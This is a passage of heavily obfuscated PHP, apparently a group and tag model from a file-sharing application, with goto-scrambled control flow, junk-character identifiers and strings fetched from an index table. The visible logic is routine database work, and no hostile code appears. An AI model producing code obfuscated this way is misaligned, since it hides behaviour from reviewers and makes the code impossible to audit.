$Eê®†¥øŠ[314])) { goto Dõ„¡ï…ß; Dõ„¡ï…ß: $DÔ‰³ßã¦È = $this->groupChildrenAll($C˜°‹æ¹‹); $BÜ’¯¯ç‘ = $this->_searchFromMeta($Eê®†¥øŠ[437], $d°Ê“ÆÈë„, 10, $DÔ‰³ßã¦È); $E‹—š»‰×Ã = $this->_searchFromMeta($Eê®†¥øŠ[438], $d°Ê“ÆÈë„, 10, $DÔ‰³ßã¦È); goto f¹ê‡˜ÏÆß; f¹ê‡˜ÏÆß: $c‹Ø‘’íé = array_merge($BÜ’¯¯ç‘, $E‹—š»‰×Ã, $b˜Ç†ÈçéŞ[$Eê®†¥øŠ[365]]); $b˜Ç†ÈçéŞ[$Eê®†¥øŠ[365]] = array_unique_by_key($c‹Ø‘’íé, $Eê®†¥øŠ[1663]); $b˜Ç†ÈçéŞ[$Eê®†¥øŠ[362]][$Eê®†¥øŠ[363]] = count($b˜Ç†ÈçéŞ[$Eê®†¥øŠ[365]]); goto cêºŒ”“¦¿; cêºŒ”“¦¿: $b˜Ç†ÈçéŞ[$Eê®†¥øŠ[362]][$Eê®†¥øŠ[364]] = ceil($b˜Ç†ÈçéŞ[$Eê®†¥øŠ[362]][$Eê®†¥øŠ[363]] / $b˜Ç†ÈçéŞ[$Eê®†¥øŠ[362]][$Eê®†¥øŠ[359]]); goto fö‡ô‚˜’…; fö‡ô‚˜’…: } $this->_listDataApply($b˜Ç†ÈçéŞ[$Eê®†¥øŠ[365]]); goto E‰ÍÌõŒ¯Ÿ; cÒé‹öÔİ²: $Eê®†¥øŠ =& $_SERVER[Š‰]; $d°Ê“ÆÈë„ = $c™é‹±ƒõš[$Eê®†¥øŠ[1747]]; $C˜°‹æ¹‹ = isset($c™é‹±ƒõš[$Eê®†¥øŠ[1748]]) ? $c™é‹±ƒõš[$Eê®†¥øŠ[1748]] : !1; goto FÍ‡ßÜ™Øß; E‰ÍÌõŒ¯Ÿ: return $b˜Ç†ÈçéŞ; goto e¸Õ½ñ¦Ä; f §ø“ÆÇ‰: if ($C˜°‹æ¹‹) { $CÅ…°äã§ = $this->getInfoSimple($C˜°‹æ¹‹); $cøÅî•´‘ = $CÅ…°äã§[$Eê®†¥øŠ[481]] . $C˜°‹æ¹‹ . $Eê®†¥øŠ[508]; $bÚŞÚÖ‹¶ = array($bÚŞÚÖ‹¶, array($Eê®†¥øŠ[481] => array($Eê®†¥øŠ[378], $cøÅî•´‘))); } $bÚŞÚÖ‹¶ = $this->parseWhereLike($bÚŞÚÖ‹¶); $b˜Ç†ÈçéŞ = $this->_makeOrder()->where($bÚŞÚÖ‹¶)->selectPage(20); goto D¬Øñ¹Ò†; FÍ‡ßÜ™Øß: if (!trim($d°Ê“ÆÈë„)) { return !1; } $d°Ê“ÆÈë„ = str_replace($Eê®†¥øŠ[1749], $Eê®†¥øŠ[1750], $d°Ê“ÆÈë„); $bÚŞÚÖ‹¶ = array($Eê®†¥øŠ[1663] => array($Eê®†¥øŠ[378], "{$d°Ê“ÆÈë„}\45"), $Eê®†¥øŠ[28] => array($Eê®†¥øŠ[378], "\x25{$d°Ê“ÆÈë„}\x25"), $Eê®†¥øŠ[934] => $Eê®†¥øŠ[1751]); goto f §ø“ÆÇ‰; e¸Õ½ñ¦Ä: } protected function groupChildrenAll($fË˜™£Ä) { $FÌßÜ¤Òç¿ =& $_SERVER[Š‰]; if (!$fË˜™£Ä) { return !1; } if (is_string($fË˜™£Ä)) { $fË˜™£Ä = array($fË˜™£Ä); } $c¡ËÀô„¢ = $fË˜™£Ä; foreach ($fË˜™£Ä as $fßÅùÔÊ˜Œ) { $eì®Š¾¦¬ô = $this->getInfoSimple($fßÅùÔÊ˜Œ); $aÍééêª•Ü = array($FÌßÜ¤Òç¿[481] => array($FÌßÜ¤Òç¿[378], $eì®Š¾¦¬ô[$FÌßÜ¤Òç¿[481]] . $fßÅùÔÊ˜Œ . $FÌßÜ¤Òç¿[508])); $B°´ÎŸŠ¢ = $this->field($FÌßÜ¤Òç¿[1663])->where($aÍééêª•Ü)->select(); $c¡ËÀô„¢ = array_merge($c¡ËÀô„¢, array_to_keyvalue($B°´ÎŸŠ¢, $FÌßÜ¤Òç¿[33], $FÌßÜ¤Òç¿[1663])); } return array_unique($c¡ËÀô„¢); } private function _searchFromMeta($CêŞ‹œªù•, $FÄƒÙãˆÏ, $dé©÷³óÍÎ, $Døãßñ¤) { goto d‹·óå‰¯Ì; c’ËÌİø¹­: if (!$Cª´›”ËÄ) { return array(); } $Cª´›”ËÄ = array_to_keyvalue($Cª´›”ËÄ, $C­¤’¦ô’„[33], $C­¤’¦ô’„[1663]); $Aá°¾Âòï = $this->where(array($C­¤’¦ô’„[1742] => array($C­¤’¦ô’„[7], $Cª´›”ËÄ)))->select(); goto dà“’Œ®ø—; d‹·óå‰¯Ì: $C­¤’¦ô’„ =& $_SERVER[Š‰]; $FÄƒÙãˆÏ = strtolower($FÄƒÙãˆÏ); $a’”¢¨‰ = array($C­¤’¦ô’„[92] => $CêŞ‹œªù•, $C­¤’¦ô’„[370] => array($C­¤’¦ô’„[378], "\45{$FÄƒÙãˆÏ}\x25")); goto CÙ›“’À’Ş; CÙ›“’À’Ş: $a’”¢¨‰ = $this->parseWhereLike($a’”¢¨‰); if ($Døãßñ¤) { $a’”¢¨‰[$C­¤’¦ô’„[1663]] = array($C­¤’¦ô’„[7], $Døãßñ¤); } $Cª´›”ËÄ = Model($C­¤’¦ô’„[1752])->where($a’”¢¨‰)->limit($dé©÷³óÍÎ)->select(); goto c’ËÌİø¹­; dà“’Œ®ø—: if (!$Aá°¾Âòï) { return array(); } return $Aá°¾Âòï; goto bª“ãš§÷Ö; bª“ãš§÷Ö: } protected function _listDataApplyItem($F­°™ˆ·ôØ) { $EÂİ’ÃØ = array($F­°™ˆ·ôØ); $this->_listDataApply($EÂİ’ÃØ); return $EÂİ’ÃØ[0]; } protected function _listDataApply(&$e¨±Üàßê) { goto dğì±¿¥›æ; cÈ»ƒÌÒÈš: $this->_listAppendParent($e¨±Üàßê); $this->_listAppendSourceRoot($e¨±Üàßê, $còµÄ…ŞÔ); goto CÁÂˆî²‘ä; B…Æ‘˜»¤Î: $this->_listAppendChildren($e¨±Üàßê); $this->_listAppendChildrenMember($e¨±Üàßê); $this->_listAppendMeta($e¨±Üàßê, $còµÄ…ŞÔ); goto cÈ»ƒÌÒÈš; dğì±¿¥›æ: $b‡¼­‰ºäŠ =& $_SERVER[Š‰]; if (!$e¨±Üàßê) { return; } $còµÄ…ŞÔ = array_to_keyvalue($e¨±Üàßê, $b‡¼­‰ºäŠ[33], $b‡¼­‰ºäŠ[1663]); goto B…Æ‘˜»¤Î; CÁÂˆî²‘ä: } private function _listAppendChildren(&$fÁ­ê¯Š¯) { goto BŠî­¹”ÏÓ; eÑ§¾àÁß: foreach ($fÁ­ê¯Š¯ as &$A¡ÎÅ¥«ÂÈ) { $Dª°¾‡¯¶ì = $A¡ÎÅ¥«ÂÈ[$d°Š ÅÓ½”[1663]]; $A¡ÎÅ¥«ÂÈ[$d°Š ÅÓ½”[1754]] = isset($Aí£ã‰ÎÉø[$Dª°¾‡¯¶ì]) ? intval($Aí£ã‰ÎÉø[$Dª°¾‡¯¶ì]) : !1; } unset($A¡ÎÅ¥«ÂÈ); goto dÙ‹£òŒç; BöÉø†‚œé: $C¥»óÏŸãñ = array($d°Š ÅÓ½”[472], $d°Š ÅÓ½”[1753] => $d°Š ÅÓ½”[474]); $f¥ÅßìÏè¬ = $this->field($C¥»óÏŸãñ)->where($EĞĞ‰—ç)->group($d°Š ÅÓ½”[472])->select(); $Aí£ã‰ÎÉø = array_to_keyvalue($f¥ÅßìÏè¬, $d°Š ÅÓ½”[472], $d°Š ÅÓ½”[474]); goto eÑ§¾àÁß; BŠî­¹”ÏÓ: $d°Š ÅÓ½” =& $_SERVER[Š‰]; $AË±§ÍÓé = array_to_keyvalue($fÁ­ê¯Š¯, $d°Š ÅÓ½”[33], $d°Š ÅÓ½”[1663]); $EĞĞ‰—ç = array($d°Š ÅÓ½”[472] => array($d°Š ÅÓ½”[7], $AË±§ÍÓé)); goto BöÉø†‚œé; dÙ‹£òŒç: } private function _listAppendChildrenMember(&$d¾‰ŠÖÓµ) { goto A¾ª°Èß”È; BÀ‘•ù‹ÏÅ: $E‘›èŒ¹Ìä = array($cŞƒÛ±‰á»[1663], $cŞƒÛ±‰á»[1753] => $cŞƒÛ±‰á»[474]); $E•®ë­†È = Model($cŞƒÛ±‰á»[1745])->field($E‘›èŒ¹Ìä)->where($bšŒ¡•ùŞ´)->group($cŞƒÛ±‰á»[1663])->select(); $aÍ‡Ã¡ïëğ = array_to_keyvalue($E•®ë­†È, $cŞƒÛ±‰á»[1663], $cŞƒÛ±‰á»[474]); goto C²¨¯Šµ¸¥; C²¨¯Šµ¸¥: foreach ($d¾‰ŠÖÓµ as &$d» ß§ê) { $Dï–Öİºõ¯ = $d» ß§ê[$cŞƒÛ±‰á»[1663]]; $d» ß§ê[$cŞƒÛ±‰á»[1755]] = isset($aÍ‡Ã¡ïëğ[$Dï–Öİºõ¯]) ? intval($aÍ‡Ã¡ïëğ[$Dï–Öİºõ¯]) : !1; } unset($d» ß§ê); goto dŠ–†ôÊÑ; A¾ª°Èß”È: $cŞƒÛ±‰á» =& $_SERVER[Š‰]; $Dù¥Éí¼Ø = array_to_keyvalue($d¾‰ŠÖÓµ, $cŞƒÛ±‰á»[33], $cŞƒÛ±‰á»[1663]); $bšŒ¡•ùŞ´ = array($cŞƒÛ±‰á»[1663] => array($cŞƒÛ±‰á»[7], $Dù¥Éí¼Ø)); goto BÀ‘•ù‹ÏÅ; dŠ–†ôÊÑ: } private function _listAppendMeta(&$FìÈã¬´‡á, $BŒåá÷Œä) { goto Aİî¢É›¥; fëÌéÜîô„: foreach ($FìÈã¬´‡á as &$aò’•¾óİ) { $aò’•¾óİ[$A‡™¥ˆİù[439]] = array(); if (isset($C“å…Œ«›[$aò’•¾óİ[$A‡™¥ˆİù[1663]]])) { $aò’•¾óİ[$A‡™¥ˆİù[439]] = $C“å…Œ«›[$aò’•¾óİ[$A‡™¥ˆİù[1663]]]; } } unset($aò’•¾óİ); goto BŒÍ»Ğö½”; Aİî¢É›¥: $A‡™¥ˆİù =& $_SERVER[Š‰]; $Eˆ†Ãà³Ğ¨ = array($A‡™¥ˆİù[1663] => array($A‡™¥ˆİù[7], $BŒåá÷Œä)); $C“å…Œ«› = Model($A‡™¥ˆİù[1744])->where($Eˆ†Ãà³Ğ¨)->select(); goto b¯”  Âô¼; b¯”  Âô¼: $C“å…Œ«› = array_to_keyvalue_group($C“å…Œ«›, $A‡™¥ˆİù[1663]); foreach ($C“å…Œ«› as &$F† åÓ‡ŞÉ) { $F† åÓ‡ŞÉ = array_to_keyvalue($F† åÓ‡ŞÉ, $A‡™¥ˆİù[92], $A‡™¥ˆİù[370]); } unset($F† åÓ‡ŞÉ); goto fëÌéÜîô„; BŒÍ»Ğö½”: } protected function parentLevelArray($CŸÅø…ôè) { $eå®¶»‰‰ =& $_SERVER[Š‰]; $CŸÅø…ôè = explode($eå®¶»‰‰[47], trim($CŸÅø…ôè, $eå®¶»‰‰[47])); $CŸÅø…ôè = array_remove_value($CŸÅø…ôè, $eå®¶»‰‰[491]); return $CŸÅø…ôè; } private function _listAppendParent(&$fè†´ö«Ëí) { goto D¾¨¡’ùÕ»; F¤‡‹ÕìğÚ: foreach ($fè†´ö«Ëí as &$añ„ë ŒÇÕ) { $B°Š¿¤Á…µ = $this->parentLevelArray($añ„ë ŒÇÕ[$E‰ø‘«é§Ğ[481]]); $E±Ò¿Ç‘î½ = $E‰ø‘«é§Ğ[33]; foreach ($B°Š¿¤Á…µ as $E¨ñ³¦¼§ => $bîÏØ¬½ç£) { if ($bó‘ŞÅÍ && $E¨ñ³¦¼§ == 0) { continue; } $E±Ò¿Ç‘î½ .= $b‹¹¸Åœˆğ[$bîÏØ¬½ç£] . $E‰ø‘«é§Ğ[8]; } if ($B°Š¿¤Á…µ) { $E±Ò¿Ç‘î½ .= $añ„ë ŒÇÕ[$E‰ø‘«é§Ğ[28]]; } $añ„ë ŒÇÕ[$E‰ø‘«é§Ğ[485]] = str_replace($E‰ø‘«é§Ğ[490], $E‰ø‘«é§Ğ[8], $E±Ò¿Ç‘î½); } unset($añ„ë ŒÇÕ); goto F¦çïğóÄ÷; D¾¨¡’ùÕ»: $E‰ø‘«é§Ğ =& $_SERVER[Š‰]; $b‹¹¸Åœˆğ = array(); foreach ($fè†´ö«Ëí as &$añ„ë ŒÇÕ) { $b‹¹¸Åœˆğ[$añ„ë ŒÇÕ[$E‰ø‘«é§Ğ[1663]]] = $añ„ë ŒÇÕ[$E‰ø‘«é§Ğ[28]]; $B°Š¿¤Á…µ = $this->parentLevelArray($añ„ë ŒÇÕ[$E‰ø‘«é§Ğ[481]]); foreach ($B°Š¿¤Á…µ as $bîÏØ¬½ç£) { if (!isset($b‹¹¸Åœˆğ[$bîÏØ¬½ç£])) { $b‹¹¸Åœˆğ[$bîÏØ¬½ç£] = 0; } } } goto Eœ©„Ãìˆ; Eœ©„Ãìˆ: unset($añ„ë ŒÇÕ); foreach ($b‹¹¸Åœˆğ as $E¨ñ³¦¼§ => $cºš§Ç†ÌŞ) { if ($cºš§Ç†ÌŞ) { continue; } $d®¨Ô¸æÓ = $this->getInfoSimple($E¨ñ³¦¼§); $b‹¹¸Åœˆğ[$E¨ñ³¦¼§] = $d®¨Ô¸æÓ[$E‰ø‘«é§Ğ[28]]; } $bó‘ŞÅÍ = $GLOBALS[$E‰ø‘«é§Ğ[6]][$E‰ø‘«é§Ğ[87]][$E‰ø‘«é§Ğ[1756]]; goto F¤‡‹ÕìğÚ; F¦çïğóÄ÷: } private function _listAppendSourceRoot(&$C¦¿ñÅ Ú¹, $DÆğå³ùÊ‹) { goto b´»Ä„½™; e¥ñÌÂ‰Ëà: foreach ($C¦¿ñÅ Ú¹ as &$a»ù™÷¯óè) { $a»ù™÷¯óè[$E‘Í ø¤Ë[84]] = $d­Üî“˜÷İ[$a»ù™÷¯óè[$E‘Í ø¤Ë[1663]]] ? $d­Üî“˜÷İ[$a»ù™÷¯óè[$E‘Í ø¤Ë[1663]]] : array(); } unset($a»ù™÷¯óè); goto DÆ¦ïÊ®ƒ·; b´»Ä„½™: $E‘Í ø¤Ë =& $_SERVER[Š‰]; $DÌ¦Õæ´Œ¤ = array($E‘Í ø¤Ë[398] => SourceModel::TYPE_GROUP, $E‘Í ø¤Ë[472] => 0, $E‘Í ø¤Ë[478] => array($E‘Í ø¤Ë[7], $DÆğå³ùÊ‹)); $Fäğë¿ß‹Œ = $E‘Í ø¤Ë[1757]; goto B™¡›‡”–´; B™¡›‡”–´: $d­Üî“˜÷İ = Model($E‘Í ø¤Ë[775])->order($E‘Í ø¤Ë[1758])->field($Fäğë¿ß‹Œ)->where($DÌ¦Õæ´Œ¤)->select(); $d­Üî“˜÷İ = array_to_keyvalue($d­Üî“˜÷İ, $E‘Í ø¤Ë[478]); $d­Üî“˜÷İ = array_remove_key($d­Üî“˜÷İ, $E‘Í ø¤Ë[478]); goto e¥ñÌÂ‰Ëà; DÆ¦ïÊ®ƒ·: } protected function groupMerge($eƒŸ£­¿‚) { $eƒŸ£­¿‚ = array_values(array_unique($eƒŸ£­¿‚)); $F’Ü‰ŸÒí = array(); for ($dĞå—¸Â = 0; $dĞå—¸Â < count($eƒŸ£­¿‚); $dĞå—¸Â++) { $FÚé£Òøî‰ = !1; for ($b°æ¡ßœ = 0; $b°æ¡ßœ < count($eƒŸ£­¿‚); $b°æ¡ßœ++) { if ($dĞå—¸Â == $b°æ¡ßœ) { continue; } if ($this->isParentOf($eƒŸ£­¿‚[$b°æ¡ßœ], $eƒŸ£­¿‚[$dĞå—¸Â])) { $FÚé£Òøî‰ = !0; break; } } if (!$FÚé£Òøî‰) { $F’Ü‰ŸÒí[] = $eƒŸ£­¿‚[$dĞå—¸Â]; } } return $F’Ü‰ŸÒí; } protected function isParentOf($Fà³İØĞÎã, $EÅºÜ¦ˆëÔ) { goto e÷„øàƒ¨‚; F·âÇ±°ª: $f°°†´ Â = $this->getInfoSimple($EÅºÜ¦ˆëÔ); $bÀáé‚È†í = $aâ»Æ±Œ£[$d´ãâä©‰‹[481]] . $Fà³İØĞÎã . $d´ãâä©‰‹[47]; if (substr($f°°†´ Â[$d´ãâä©‰‹[481]], 0, strlen($bÀáé‚È†í)) == $bÀáé‚È†í) { return !0; } goto aíšÈ†¾†ï; e÷„øàƒ¨‚: $d´ãâä©‰‹ =& $_SERVER[Š‰]; if (!$Fà³İØĞÎã || !$EÅºÜ¦ˆëÔ || $Fà³İØĞÎã == $EÅºÜ¦ˆëÔ) { return !1; } $aâ»Æ±Œ£ = $this->getInfoSimple($Fà³İØĞÎã); goto F·âÇ±°ª; aíšÈ†¾†ï: return !1; goto få‰¤Ä‰¦‚; få‰¤Ä‰¦‚: } public function groupShowRoot($eÇ„‘·î, $Dêç„½ùÀ› = false) { goto a™Ø—İ¼’; cÚ¡ä¿„ò: return $bËˆ‚òª§»; goto b«‚¿óˆÜ; BôÌÈîÜáµ: if ($Dêç„½ùÀ› && count($EÍø¨ÙËî‘) == 1) { return $bËˆ‚òª§»; } if (!$DŸŞ…ë„ÆŒ[$eÚæÀ°àŠµ[439]] || !isset($DŸŞ…ë„ÆŒ[$eÚæÀ°àŠµ[439]][$eÚæÀ°àŠµ[1740]]) || $DŸŞ…ë„ÆŒ[$eÚæÀ°àŠµ[439]][$eÚæÀ°àŠµ[1740]] == $eÚæÀ°àŠµ[1714]) { return $this->groupShowRoot($EÍø¨ÙËî‘[count($EÍø¨ÙËî‘) - 1], $Dêç„½ùÀ›); } if ($DŸŞ…ë„ÆŒ[$eÚæÀ°àŠµ[439]][$eÚæÀ°àŠµ[1740]] == $eÚæÀ°àŠµ[355]) { $C­¶åãõ¥¹ = explode($eÚæÀ°àŠµ[47], $DŸŞ…ë„ÆŒ[$eÚæÀ°àŠµ[439]][$eÚæÀ°àŠµ[1741]]); if ($C­¶åãõ¥¹) { $bËˆ‚òª§» = array_merge($bËˆ‚òª§», $C­¶åãõ¥¹); } } goto cÚ¡ä¿„ò; a™Ø—İ¼’: $eÚæÀ°àŠµ =& $_SERVER[Š‰]; $DŸŞ…ë„ÆŒ = $this->getInfo($eÇ„‘·î); if (!$DŸŞ…ë„ÆŒ) { return array(); } goto Cï¡İäê•Œ; Cï¡İäê•Œ: $EÍø¨ÙËî‘ = $this->parentLevelArray($DŸŞ…ë„ÆŒ[$eÚæÀ°àŠµ[481]]); $bËˆ‚òª§» = array($eÇ„‘·î); if (count($EÍø¨ÙËî‘) == 0) { return $bËˆ‚òª§»; } goto BôÌÈîÜáµ; b«‚¿óˆÜ: } protected function resetParentLevel() { $CôÈáö =& $_SERVER[Š‰]; $CÑŠ©õŠ˜æ = $CôÈáö[1663]; $FÆ¶÷İºÓ = $this->select(); $FÆ¶÷İºÓ = array_to_keyvalue($FÆ¶÷İºÓ, $CÑŠ©õŠ˜æ); foreach ($FÆ¶÷İºÓ as $a§ªõÔ©…‰) { goto D£‘ÆàÚÜÌ; AÉ¥µØÖ™´: $AÖ•ÏƒƒÍÇ[] = 0; $AÖ•ÏƒƒÍÇ = $CôÈáö[47] . implode($CôÈáö[47], array_reverse($AÖ•ÏƒƒÍÇ)) . $CôÈáö[47]; $this->setNamePinyin($a§ªõÔ©…‰[$CÑŠ©õŠ˜æ], $a§ªõÔ©…‰[$CôÈáö[28]]); goto F¤‰Ü»•‡; D£‘ÆàÚÜÌ: $F¸°æÙâì = $a§ªõÔ©…‰; $AÖ•ÏƒƒÍÇ = array(); while ($F¸°æÙâì[$CôÈáö[472]] != 0) { $AÖ•ÏƒƒÍÇ[] = $F¸°æÙâì[$CôÈáö[472]]; $F¸°æÙâì = $FÆ¶÷İºÓ[$F¸°æÙâì[$CôÈáö[472]]]; } goto AÉ¥µØÖ™´; F¤‰Ü»•‡: $this->where(array($CÑŠ©õŠ˜æ => $a§ªõÔ©…‰[$CÑŠ©õŠ˜æ]))->save(array($CôÈáö[548] => $AÖ•ÏƒƒÍÇ)); goto dÚ“õ×İî; dÚ“õ×İî: } return $FÆ¶÷İºÓ; } public function groupNameAuto($aÑÖÑ¾ÄÛÚ, $C¬âŠÖ­) { $dŒ•«ë£« =& $_SERVER[Š‰]; $BÈµ®éÍæ = $this->where(array($dŒ•«ë£«[389] => $aÑÖÑ¾ÄÛÚ))->getField($dŒ•«ë£«[28], !0); if (!$BÈµ®éÍæ || !in_array($C¬âŠÖ­, $BÈµ®éÍæ)) { return $C¬âŠÖ­; } for ($EÎ¦Ìˆ˜äÆ = 1; $EÎ¦Ìˆ˜äÆ <= count($BÈµ®éÍæ) + 1; $EÎ¦Ìˆ˜äÆ++) { $c†õ²¶£šˆ = $C¬âŠÖ­ . "\50{$EÎ¦Ìˆ˜äÆ}\51"; if (!in_array($c†õ²¶£šˆ, $BÈµ®éÍæ)) { return $c†õ²¶£šˆ; } } } public function groupSwitch($bƒå…ºÀ” , $f‚­‘–ù™) { goto c¦ó¯—‚˜ò; d†²Ÿùİ: $bĞÚË†ù¹¯ = array($dóàÒöÈíº[398] => 2, $dóàÒöÈíº[472] => 0, $dóàÒöÈíº[397] => 1, $dóàÒöÈíº[478] => array($dóàÒöÈíº[7], array($bƒå…ºÀ” , $f‚­‘–ù™))); $b†øô¥Â = Model($dóàÒöÈíº[775])->where($bĞÚË†ù¹¯)->field($dóàÒöÈíº[1760])->select(); $b†øô¥Â = array_to_keyvalue($b†øô¥Â, $dóàÒöÈíº[478], $dóàÒöÈíº[390]); goto eÂË»Š¢Œ”; Dší‚°§•ƒ: $B¢²óò’¬Î = Model($dóàÒöÈíº[1745])->where($bĞÚË†ù¹¯)->select(); if (!$B¢²óò’¬Î) { $B¢²óò’¬Î = array(); } foreach ($B¢²óò’¬Î as $cò’¬²‹…œ) { $E„Ô‰’ö‚ = $cò’¬²‹…œ[$dóàÒöÈíº[1500]]; $bĞÚË†ù¹¯ = array($dóàÒöÈíº[1500] => $E„Ô‰’ö‚, $dóàÒöÈíº[1663] => $f‚­‘–ù™); $eá÷ÆÑ’çÛ = Model($dóàÒöÈíº[1745])->where($bĞÚË†ù¹¯)->find(); if (!$eá÷ÆÑ’çÛ) { $EÜÉÊ…å¤‰ = array($f‚­‘–ù™ => $cò’¬²‹…œ[$dóàÒöÈíº[1759]]); Model($dóàÒöÈíº[501])->userGroupAdd($E„Ô‰’ö‚, $EÜÉÊ…å¤‰); } Model($dóàÒöÈíº[501])->userGroupRemove($E„Ô‰’ö‚, $bƒå…ºÀ” ); } goto d†²Ÿùİ; eÂË»Š¢Œ”: $bİŸ¸»Ç‹ = !empty($b†øô¥Â[$bƒå…ºÀ” ]) ? $b†øô¥Â[$bƒå…ºÀ” ] : !1; if ($bİŸ¸»Ç‹) { goto C°„ÖÆ’–Ä; C°„ÖÆ’–Ä: if (!$b†øô¥Â[$f‚­‘–ù™]) { $b†øô¥Â[$f‚­‘–ù™] = Model($dóàÒöÈíº[775])->groupRootAdd($f‚­‘–ù™); } $a‘ˆ‰×”ê = $b†øô¥Â[$f‚­‘–ù™]; $bĞÚË†ù¹¯ = array($dóàÒöÈíº[472] => $bİŸ¸»Ç‹); goto CÌÏ¬¸Şƒ; d«ëŸ†ŠÅ: $DÊ™íÕô© = array($dóàÒöÈíº[478] => $f‚­‘–ù™); Model($dóàÒöÈíº[1762])->where($bĞÚË†ù¹¯)->save($DÊ™íÕô©); Model($dóàÒöÈíº[1763])->where($bĞÚË†ù¹¯)->save($DÊ™íÕô©); goto aÅµ’ÀŞ¤¨; f¬½ªÎÃ: foreach ($b†øô¥Â as $Cøğš°‰•‡) { $a°å¾İÜ½ = $Cøğš°‰•‡[$dóàÒöÈíº[397]] == $dóàÒöÈíº[86] ? REPEAT_RENAME_FOLDER : REPEAT_RENAME; Model($dóàÒöÈíº[775])->move($Cøğš°‰•‡[$dóàÒöÈíº[390]], $a‘ˆ‰×”ê, $a°å¾İÜ½); } Model($dóàÒöÈíº[775])->moveClearAuth = !0; $bĞÚË†ù¹¯ = array($dóàÒöÈíº[398] => 2, $dóàÒöÈíº[478] => $bƒå…ºÀ” ); goto d«ëŸ†ŠÅ; CÌÏ¬¸Şƒ: $b†øô¥Â = Model($dóàÒöÈíº[775])->where($bĞÚË†ù¹¯)->field($dóàÒöÈíº[1761])->select(); if (!$b†øô¥Â) { $b†øô¥Â = array(); } Model($dóàÒöÈíº[775])->moveClearAuth = !1; goto f¬½ªÎÃ; aÅµ’ÀŞ¤¨: } $this->_changeChildLevel($C–—ïõ•‰±[$bƒå…ºÀ” ], $C–—ïõ•‰±[$f‚­‘–ù™], !0); goto d´ó¯­Â‘; fƒæŞšÛåŒ: $C–—ïõ•‰± = array_to_keyvalue($C–—ïõ•‰±, $dóàÒöÈíº[1663]); if (!isset($C–—ïõ•‰±[$bƒå…ºÀ” ]) || !isset($C–—ïõ•‰±[$f‚­‘–ù™]) || $C–—ïõ•‰±[$bƒå…ºÀ” ][$dóàÒöÈíº[472]] == 0) { return !1; } $bĞÚË†ù¹¯ = array($dóàÒöÈíº[1663] => $bƒå…ºÀ” ); goto Dší‚°§•ƒ; d´ó¯­Â‘: $this->where(array($dóàÒöÈíº[472] => $bƒå…ºÀ” ))->save(array($dóàÒöÈíº[472] => $f‚­‘–ù™)); return !0; goto AµÈ„¥Š†‹; c¦ó¯—‚˜ò: $dóàÒöÈíº =& $_SERVER[Š‰]; $bĞÚË†ù¹¯ = array($dóàÒöÈíº[1663] => array($dóàÒöÈíº[7], array($bƒå…ºÀ” , $f‚­‘–ù™))); $C–—ïõ•‰± = $this->where($bĞÚË†ù¹¯)->select(); goto fƒæŞšÛåŒ; AµÈ„¥Š†‹: } } class GroupTagModel extends ModelBase { protected $tableName = "\x75\x73\145\x72\137\146\x61\x76"; protected function cacheFunctionAlias($d§ˆšà‡¥Á) { $a„ëŸÔŸ¶Ö =& $_SERVER[Š‰]; return array($a„ëŸÔŸ¶Ö[1764] => array($d§ˆšà‡¥Á[0], $a„ëŸÔŸ¶Ö[1765]), $a„ëŸÔŸ¶Ö[1766] => array($d§ˆšà‡¥Á[0], $a„ëŸÔŸ¶Ö[1767])); } protected function get($bÏËƒµ¼) { $c°¥ÊËß‰æ =& $_SERVER[Š‰]; $AŸšÏ½¦ÎØ = Model($c°¥ÊËß‰æ[480])->metaGet($bÏËƒµ¼, $c°¥ÊËß‰æ[1768]); $DßÏ·†Ê¡¸ = json_decode($AŸšÏ½¦ÎØ, !0); return $DßÏ·†Ê¡¸ ? $DßÏ·†Ê¡¸ : array($c°¥ÊËß‰æ[1769] => $c°¥ÊËß‰æ[86], $c°¥ÊËß‰æ[365] => array()); } protected function set($dÒâÑÌŠ˜ò, $f”¥æÀÀæ) { $C±×î•†§à =& $_SERVER[Š‰]; $f”¥æÀÀæ = $f”¥æÀÀæ ? $f”¥æÀÀæ : array($C±×î•†§à[1769] => $C±×î•†§à[86], $C±×î•†§à[365] => array()); Model($C±×î•†§à[480])->metaSet($dÒâÑÌŠ˜ò, $C±×î•†§à[1768], json_encode($f”¥æÀÀæ)); return Model($C±×î•†§à[480])->metaSet($dÒâÑÌŠ˜ò, $C±×î•†§à[1768], json_encode($f”¥æÀÀæ)); } protected function getByTagID($bÔï¡†É‘, $f–ÌÙóÆ÷§) { goto C¶ğ‘¬™¤ß; FŠ˜Ò‚ìñ: $F»¬šœ½† = $this->get($bÔï¡†É‘); if (!$F»¬šœ½† || !isset($F»¬šœ½†[$e½ª®öñ˜Ñ[365]])) { return !1; } $f¥ïà¾ùíª = array_find_by_field($F»¬šœ½†[$e½ª®öñ˜Ñ[365]], $e½ª®öñ˜Ñ[388], $f–ÌÙóÆ÷§); goto Dçğòˆ²Îç; Dçğòˆ²Îç: return is_array($f¥ïà¾ùíª) ? $f¥ïà¾ùíª : !1; goto bË¼©‰ ìÏ; C¶ğ‘¬™¤ß: $e½ª®öñ˜Ñ =& $_SERVER[Š‰]; if (!$bÔï¡†É‘ || !$f–ÌÙóÆ÷§) { return !1; } if (!Model($e½ª®öñ˜Ñ[480])->getInfoSimple($bÔï¡†É‘)) { return !1; } goto FŠ˜Ò‚ìñ; bË¼©‰ ìÏ: } public function listSource($FìæêºÍ«Š, $CœËë³Á¼¤) { goto ağƒÛÉÏÍ£; E´Ç¦–¥ë¦: if ($aÈë°’˜ù©) { $this->removeBySource($FìæêºÍ«Š, $aÈë°’˜ù©); } return $a»ÕçÖ’º”; goto EŠÄ¸ÅçŞÒ; Då“ïå¤Êí: if (!$a»ÕçÖ’º” || count($d×‘ÈšÌšî) == $a»ÕçÖ’º”[$CğíŠéÂ£[362]][$CğíŠéÂ£[363]]) { return $a»ÕçÖ’º”; } $aÈë°’˜ù© = array(); $Bô”†ÒêÂ = array_to_keyvalue($a»ÕçÖ’º”[$CğíŠéÂ£[74]], $CğíŠéÂ£[33], $CğíŠéÂ£[390]); goto dÚÎ¶›Ó•¹; dÚÎ¶›Ó•¹: $f‹†íµšÃò = array_to_keyvalue($a»ÕçÖ’º”[$CğíŠéÂ£[73]], $CğíŠéÂ£[33], $CğíŠéÂ£[390]); $dàÒÏ†¹Ø = array_merge($f‹†íµšÃò, $Bô”†ÒêÂ); foreach ($d×‘ÈšÌšî as $e¼ÅÎÓÛ) { if (!in_array($e¼ÅÎÓÛ, $dàÒÏ†¹Ø)) { $aÈë°’˜ù©[] = $e¼ÅÎÓÛ; } } goto E´Ç¦–¥ë¦; FÀ¨÷ª«: $eŠ‚µÓ£­– = array(); foreach ($c¡µ–‰‰”® as $C„ö£Ú¨›) { 